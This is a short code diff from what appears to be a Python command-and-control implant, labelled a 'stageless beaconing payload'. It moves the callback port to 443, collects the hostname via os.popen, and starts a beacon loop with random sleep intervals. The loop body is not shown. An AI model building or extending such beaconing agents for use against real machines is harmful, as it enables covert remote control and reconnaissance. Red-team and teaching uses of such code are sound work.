@@ -4,13 +4,13 @@ import os
 import random
 import base64
 
-# Stageless Payload (contains full Agent)
+# Stageless Beaconing Payload (contains full Agent)
 
-HOST, PORT = "localhost", 9999
+HOST, PORT = "localhost", 443
 command = "hostname"
 data = os.popen(command).read()
-Loop = True
 min, max = 1, 5
+Loop = True
 
 while(Loop):
 
